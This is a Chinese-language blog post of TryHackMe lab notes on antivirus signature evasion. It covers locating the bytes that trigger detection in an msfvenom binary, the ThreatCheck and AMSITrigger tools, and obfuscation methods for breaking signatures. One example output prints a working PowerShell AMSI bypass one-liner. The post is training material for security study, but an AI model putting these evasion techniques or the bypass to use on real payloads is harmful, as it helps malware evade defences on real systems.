<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM免杀学习SignatureEvasion | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction当面对先进的防病毒引擎或 EDR（端点检测和响应）解决方案时，对手可能很难克服特定的检测。 即使采用了混淆原则中讨论的一些最常见的混淆或规避技术，恶意文件中的签名可能仍然存在。工具箱的装饰图像 为了对抗持久签名，攻击者可以单独观察每个签名并根据需要对其进行处理。 在这个房间里，我们将了解什么是签名以及如何找到它们，然后尝试按照不可知论的思维过程来打破它们。 为了更深入地研究">
<meta property="og:type" content="article">
<meta property="og:title" content="THM免杀学习SignatureEvasion">
<meta property="og:url" content="http://mikannse.space/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="Introduction当面对先进的防病毒引擎或 EDR（端点检测和响应）解决方案时，对手可能很难克服特定的检测。 即使采用了混淆原则中讨论的一些最常见的混淆或规避技术，恶意文件中的签名可能仍然存在。工具箱的装饰图像 为了对抗持久签名，攻击者可以单独观察每个签名并根据需要对其进行处理。 在这个房间里，我们将了解什么是签名以及如何找到它们，然后尝试按照不可知论的思维过程来打破它们。 为了更深入地研究">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-04-09T05:50:07.000Z">
<meta property="article:modified_time" content="2024-06-14T03:29:49.180Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM免杀学习SignatureEvasion',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-06-14 11:29:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">312</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM免杀学习SignatureEvasion</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-09T05:50:07.000Z" title="发表于 2024-04-09 13:50:07">2024-04-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-14T03:29:49.180Z" title="更新于 2024-06-14 11:29:49">2024-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM免杀学习SignatureEvasion"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>当面对先进的防病毒引擎或 EDR（端点检测和响应）解决方案时，对手可能很难克服特定的检测。 即使采用了混淆原则中讨论的一些最常见的混淆或规避技术，恶意文件中的签名可能仍然存在。<br>工具箱的装饰图像</p>
<p>为了对抗持久签名，攻击者可以单独观察每个签名并根据需要对其进行处理。</p>
<p>在这个房间里，我们将了解什么是签名以及如何找到它们，然后尝试按照不可知论的思维过程来打破它们。 为了更深入地研究和对抗启发式签名，我们还将讨论更高级的代码概念和“恶意软件最佳实践”。<br>学习目标</p>
<pre><code> 了解签名的起源以及如何在恶意代码中观察/检测它们
 实施记录的混淆方法来破坏签名
 利用基于非混淆的技术来破坏非面向功能的签名。
</code></pre>
<p>这个房间是混淆原则的继承者； 如果您尚未完成，我们强烈建议您在此房间之前完成。</p>
<p>在开始本课程之前，请先熟悉基本的编程逻辑和语法。 建议了解 C 和 PowerShell，但不是必需的。</p>
<h1 id="Signature-Identification"><a href="#Signature-Identification" class="headerlink" title="Signature Identification"></a>Signature Identification</h1><p>在开始破解签名之前，我们需要了解并确定我们要寻找的内容。 如防病毒简介中所述，防病毒引擎使用签名来跟踪和识别可能的可疑和/或恶意程序。 在此任务中，我们将观察如何手动识别签名开始的确切字节。</p>
<p>在识别签名时，无论是手动还是自动，我们都必须采用迭代过程来确定签名从哪个字节开始。 通过递归地将编译的二进制文件分成两半并对其进行测试，我们可以粗略估计字节范围以进一步研究。</p>
<p>我们可以使用本机实用程序 head、dd 或 split 来拆分已编译的二进制文件。 在下面的命令提示符中，我们将使用 head 来查找 msfvenom 二进制文件中存在的第一个签名。</p>
<p>分割后，将二进制文件从您的开发环境移至具有您想要测试的防病毒引擎的计算机。 如果出现警报，请移至拆分二进制文件的下半部分并再次拆分它。 如果没有出现警报，请移至分割二进制文件的上半部分并再次分割它。 继续这种模式，直到你无法确定该去哪里； 这通常发生在千字节范围内。</p>
<p>一旦达到不再准确分割二进制文件的程度，您可以使用十六进制编辑器查看存在签名的二进制文件的末尾。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0000C2E0  43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89  Chné.....M.Ž.:é‰</span><br><span class="line">0000C2F0  67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9  go¾F...j@.h....é</span><br><span class="line">0000C300  0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90  ....Sß¡.dí@sJdV.</span><br><span class="line">0000C310  6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6  j.hX¤Såé......i¶</span><br><span class="line">0000C320  F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB  ô«.sÿÕé....}C.@Û</span><br><span class="line">0000C330  43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E  C‹¬U‚‰Ã.é....ä•Ž</span><br><span class="line">0000C340  2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC  ,.¬)£‰Ç.é.....2¬</span><br></pre></td></tr></tbody></table></figure>

<p>我们有签名的位置； 它的可读性将由工具本身和编译方法决定。</p>
<p>现在……没有人愿意花几个小时来回尝试追踪坏字节； 让我们自动化它！ 在下一个任务中，我们将研究一些 FOSS（自由开源软件）解决方案，以帮助我们识别编译代码中的签名。</p>
<h1 id="Automating-Signature-Identification"><a href="#Automating-Signature-Identification" class="headerlink" title="Automating Signature Identification"></a>Automating Signature Identification</h1><p>上一个任务中显示的过程可能相当艰巨。 为了加快速度，我们可以使用脚本将其自动化，以在一定时间间隔内分割字节。 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1">Find-AVSignature</a> 将通过给定的时间间隔分割提供的字节范围。</p>
<p>​            Find-AVSignature        </p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; . .\<span class="built_in">FInd-AVSignature</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Find-AVSignature</span></span><br><span class="line"></span><br><span class="line">cmdlet <span class="built_in">Find-AVSignature</span> at command pipeline position <span class="number">1</span></span><br><span class="line">Supply values <span class="keyword">for</span> the following parameters:</span><br><span class="line">StartByte: <span class="number">0</span></span><br><span class="line">EndByte: max</span><br><span class="line">Interval: <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Do</span> you want to <span class="keyword">continue</span>?</span><br><span class="line">This script will result <span class="keyword">in</span> <span class="number">1</span> binaries being written to <span class="string">"C:\Users\TryHackMe"</span>!</span><br><span class="line"><span class="function">[<span class="type">Y</span>] <span class="title">Yes</span></span>  <span class="function">[<span class="type">N</span>] <span class="title">No</span></span>  <span class="function">[<span class="type">S</span>] <span class="title">Suspend</span></span>  <span class="function">[?] <span class="title">Help</span></span> (default is <span class="string">"Y"</span>): y</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>该脚本减轻了很多手动工作，但仍然有一些限制。 虽然它比前一个任务需要更少的交互，但仍然需要设置适当的间隔才能正常运行。 该脚本也只会在将二进制文件放入磁盘时观察其字符串，而不是使用防病毒引擎的完整功能进行扫描。</p>
<p>为了解决这个问题，我们可以使用其他 <strong>FOSS</strong>（<strong>F</strong>ree 和 <strong>O</strong>pen-<strong>S</strong>ource <strong>S</strong>oftware）工具，这些工具利用引擎本身来扫描 文件，包括 <a target="_blank" rel="noopener" href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>、<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> 和 <a target="_blank" rel="noopener" href="https://github.com/github.com/rasta-mouse/ThreatCheck">AMSITrigger</a>。 com/RythmStick/AMSITrigger）。 在本任务中，我们将主要关注 ThreatCheck，并在最后简要提及 AMSITrigger 的使用。</p>
<hr>
<h3 id="ThreatCheck"><a href="#ThreatCheck" class="headerlink" title="ThreatCheck"></a>ThreatCheck</h3><p>ThreatCheck 是 DefenderCheck 的一个分支，可以说是三者中使用最广泛/最可靠的。 为了识别可能的签名，ThreatCheck 利用多个防病毒引擎来对抗分割编译的二进制文件，并报告它认为存在坏字节的地方。</p>
<p>ThreatCheck 不向公众提供预编译版本。 为了方便使用，我们已经为您编译了该工具； 它可以在所连接计算机的“C:\Users\Administrator\Desktop\Tools”中找到。</p>
<p>以下是 ThreatCheck 的基本语法用法。</p>
<p>​            ThreatCheck Help Menu        </p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;ThreatCheck.exe <span class="literal">--help</span></span><br><span class="line">  <span class="literal">-e</span>, <span class="literal">--engine</span>    (Default: Defender) Scanning engine. Options: Defender, AMSI</span><br><span class="line">  <span class="operator">-f</span>, <span class="literal">--file</span>      Analyze a file on disk</span><br><span class="line">  <span class="literal">-u</span>, <span class="literal">--url</span>       Analyze a file from a URL</span><br><span class="line">  <span class="literal">--help</span>          Display this help screen.</span><br><span class="line">  <span class="literal">--version</span>       Display version information.</span><br></pre></td></tr></tbody></table></figure>

<p>对于我们的使用，我们只需要提供一个文件和一个可选的引擎； 但是，在处理 <strong>AMSI</strong>（<strong>A</strong>nti-<strong>M</strong>alware <strong>S</strong>can <strong>I</strong>nterface）时，我们主要希望使用AMSITrigger，我们将在稍后讨论 在这个任务中。</p>
<p>​            ThreatCheck        </p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;ThreatCheck.exe <span class="operator">-f</span> Downloads\Grunt.bin <span class="literal">-e</span> AMSI</span><br><span class="line">	[+] Target file size: <span class="number">31744</span> bytes</span><br><span class="line">	[+] Analyzing...</span><br><span class="line">	[!] Identified <span class="keyword">end</span> of bad bytes at offset <span class="number">0</span>x6D7A</span><br><span class="line">	<span class="number">00000000</span>   <span class="number">65</span> <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">00</span> <span class="number">22</span> <span class="number">00</span>  <span class="number">7</span>B <span class="number">00</span> <span class="number">32</span> <span class="number">00</span> <span class="number">7</span>D <span class="number">00</span> <span class="number">22</span> <span class="number">00</span>   e·<span class="string">"·:·"</span>·{·<span class="number">2</span>·}·<span class="string">"·</span></span><br><span class="line"><span class="string">	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"</span>·t·o·k·e·n·<span class="string">"·</span></span><br><span class="line"><span class="string">	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·</span></span><br><span class="line"><span class="string">	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"</span>·s·t·a·t·u·s·</span><br><span class="line">	<span class="number">00000040</span>   <span class="number">22</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">7</span>B <span class="number">00</span>  <span class="number">30</span> <span class="number">00</span> <span class="number">7</span>D <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">2</span>C <span class="number">00</span>   <span class="string">"·:·"</span>·{·<span class="number">0</span>·}·<span class="string">"·,·</span></span><br><span class="line"><span class="string">	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "</span>·o·u·t·p·u·t·<span class="string">"·</span></span><br><span class="line"><span class="string">	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"</span>·{·<span class="number">1</span>·}·<span class="string">"·}·}·</span></span><br><span class="line"><span class="string">	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"</span>·G·U·I·D</span><br><span class="line">	<span class="number">00000080</span>   <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">7</span>B  <span class="number">00</span> <span class="number">30</span> <span class="number">00</span> <span class="number">7</span>D <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">2</span>C   ·<span class="string">"·:·"</span>·{·<span class="number">0</span>·}·<span class="string">"·,</span></span><br><span class="line"><span class="string">	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"</span>·T·y·p·e·<span class="string">"·:·{</span></span><br><span class="line"><span class="string">	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"</span>·M·e·t·a</span><br><span class="line">	<span class="number">000000</span>B0   <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">7</span>B  <span class="number">00</span> <span class="number">32</span> <span class="number">00</span> <span class="number">7</span>D <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">2</span>C   ·<span class="string">"·:·"</span>·{·<span class="number">2</span>·}·<span class="string">"·,</span></span><br><span class="line"><span class="string">	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"</span>·I·V·<span class="string">"·:·"</span>·{·<span class="number">3</span></span><br><span class="line">	<span class="number">000000</span>D0   <span class="number">00</span> <span class="number">7</span>D <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">2</span>C <span class="number">00</span> <span class="number">22</span>  <span class="number">00</span> <span class="number">45</span> <span class="number">00</span> <span class="number">6</span>E <span class="number">00</span> <span class="number">63</span> <span class="number">00</span> <span class="number">72</span>   ·}·<span class="string">"·,·"</span>·E·n·c·<span class="built_in">r</span></span><br><span class="line">	<span class="number">000000</span>E0   <span class="number">00</span> <span class="number">79</span> <span class="number">00</span> <span class="number">70</span> <span class="number">00</span> <span class="number">74</span> <span class="number">00</span> <span class="number">65</span>  <span class="number">00</span> <span class="number">64</span> <span class="number">00</span> <span class="number">4</span>D <span class="number">00</span> <span class="number">65</span> <span class="number">00</span> <span class="number">73</span>   ·y·p·t·e·d·M·e·s</span><br><span class="line">	<span class="number">000000</span>F0   <span class="number">00</span> <span class="number">73</span> <span class="number">00</span> <span class="number">61</span> <span class="number">00</span> <span class="number">67</span> <span class="number">00</span> <span class="number">65</span>  <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">00</span> <span class="number">22</span> <span class="number">00</span> <span class="number">7</span>B   ·s·a·g·e·<span class="string">"·:·"</span>·{</span><br></pre></td></tr></tbody></table></figure>

<p>就这么简单！ 不需要其他配置或语法，我们可以直接修改我们的工具。 为了有效地使用这个工具，我们可以识别第一次发现的任何坏字节，然后递归地破坏它们并再次运行该工具，直到没有识别出签名。</p>
<p>注意：可能存在误报情况，其中该工具不会报告任何坏字节。 这需要你自己的直觉来观察和解决； 不过，我们将在任务 4 中进一步讨论这一点。</p>
<hr>
<h3 id="AMSITrigger"><a href="#AMSITrigger" class="headerlink" title="AMSITrigger"></a>AMSITrigger</h3><p>正如<a target="_blank" rel="noopener" href="https://tryhackme.com/room/runtimedetectionevasion">运行时检测规避</a>中所述，AMSI 利用运行时，使签名更难以识别和解析。 ThreatCheck 也不支持某些文件类型，例如 AMSITrigger 所支持的 PowerShell。</p>
<p>AMSITrigger 将利用 AMSI 引擎并针对提供的 PowerShell 脚本扫描功能，并报告它认为需要发出警报的任何特定代码部分。</p>
<p>AMSITrigger 确实在其 GitHub 上提供了预编译版本，也可以在所连接计算机的桌面上找到。</p>
<p>以下是AMSITrigger的语法用法</p>
<p>​            AMSITrigger Help Menu        </p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;amsitrigger.exe <span class="literal">--help</span></span><br><span class="line">	<span class="literal">-i</span>, <span class="literal">--inputfile</span>=VALUE       Powershell filename</span><br><span class="line">	<span class="literal">-u</span>, <span class="literal">--url</span>=VALUE             URL eg. &lt;https://<span class="number">10.1</span>.<span class="number">1.1</span>/<span class="built_in">Invoke-NinjaCopy</span>.ps1&gt;</span><br><span class="line">	<span class="operator">-f</span>, <span class="literal">--format</span>=VALUE          Output Format:</span><br><span class="line">	                              <span class="number">1</span> - Only show Triggers</span><br><span class="line">	                              <span class="number">2</span> - Show Triggers with Line numbers</span><br><span class="line">	                              <span class="number">3</span> - Show Triggers inline with code</span><br><span class="line">	                              <span class="number">4</span> - Show AMSI calls (xmas tree mode)</span><br><span class="line">	<span class="literal">-d</span>, <span class="literal">--debug</span>                 Show Debug Info</span><br><span class="line">	<span class="literal">-m</span>, <span class="literal">--maxsiglength</span>=VALUE    Maximum signature Length to cater <span class="keyword">for</span>,</span><br><span class="line">	                              default=<span class="number">2048</span></span><br><span class="line">	<span class="literal">-c</span>, <span class="literal">--chunksize</span>=VALUE       Chunk size to send to AMSIScanBuffer,</span><br><span class="line">	                              default=<span class="number">4096</span></span><br><span class="line">	<span class="literal">-h</span>, -?, <span class="literal">--help</span>              Show Help</span><br></pre></td></tr></tbody></table></figure>

<p>对于我们的用途，我们只需要提供一个文件和报告签名的首选格式。</p>
<p>​            AMSI Trigger Example        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt; .\amsitrigger.exe -i bypass.ps1 -f 3</span><br><span class="line">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</span><br></pre></td></tr></tbody></table></figure>

<p>在下一个任务中，我们将讨论如何使用从这些工具收集的信息来破解签名。</p>
<h1 id="Static-Code-Based-Signatures"><a href="#Static-Code-Based-Signatures" class="headerlink" title="Static Code-Based Signatures"></a>Static Code-Based Signatures</h1><p>一旦我们发现了一个麻烦的签名，我们就需要决定如何处理它。 根据签名的强度和类型，可以使用<a target="_blank" rel="noopener" href="https://tryhackme.com/room/obfuscationprinciples">混淆原则</a>中所述的简单混淆来破坏签名，或者可能需要特定的调查和补救措施。 在此任务中，我们的目标是提供几种解决方案来修复函数中存在的静态签名。</p>
<p><a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf">分层混淆分类法</a> 涵盖了作为 <strong>混淆方法</strong> 和 * 一部分的最可靠的解决方案 *混淆类**层。</p>
<p>混淆方法</p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody><tr>
<td>方法代理</td>
<td>创建代理方法或替换对象</td>
</tr>
<tr>
<td>方法分散/聚合</td>
<td>将多个方法合并为一个或将一个方法分散为多个</td>
</tr>
<tr>
<td>方法克隆</td>
<td>创建方法的副本并随机调用每个</td>
</tr>
</tbody></table>
<p>混淆类</p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody><tr>
<td>类层次结构扁平化</td>
<td>使用接口为类创建代理</td>
</tr>
<tr>
<td>类拆分/合并</td>
<td>将局部变量或指令组传输到另一个类</td>
</tr>
<tr>
<td>删除修饰符</td>
<td>删除类修饰符（公共、私有）并使所有成员成为公共</td>
</tr>
</tbody></table>
<p>查看上表，即使它们可能使用特定的技术术语或想法，我们也可以将它们分组为适用于任何对象或数据结构的一组核心不可知方法。</p>
<p>技术<strong>类拆分/合并</strong>和<strong>方法分散/聚合</strong>可以分组为拆分或合并任何给定 <strong>OOP</strong> (<strong>O</strong>bject-<strong>O</strong> 定向<strong>P</strong>编程）功能。</p>
<p>其他技术（例如<strong>删除修饰符</strong>或<strong>方法克隆</strong>）可以分为删除或模糊可识别信息的总体概念。</p>
<hr>
